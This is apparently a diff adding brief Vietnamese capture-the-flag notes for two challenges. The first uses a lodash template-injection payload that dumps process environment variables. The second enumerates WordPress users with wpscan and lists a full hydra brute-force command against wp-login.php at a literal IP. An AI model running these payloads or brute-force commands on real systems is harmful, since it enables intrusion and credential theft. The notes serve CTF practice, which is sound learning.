@@ -1,0 +1,13 @@
+Chall 1:
+dirsearch -> /source
+/source -> download source.zip
+Trong package.json -> phien ban lodash -> command injection
+sau khi sử sụng alert, promt,... không được
+Payload : ${JSON.stringify(process.env)}
+-> flag: KCSC{lodash_template_injection_so_ezzzz}
+
+Chall 2:
+wpscan –url http://18.142.106.71/ -> khong co gi
+wpscan –url http://18.142.106.71/ --enumerate -u -> tim duoc user khaidang va dsmile
+hydra -l admin -P ./passwordlist.txt $ip -V http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'
+-> brute force password (chua ra)
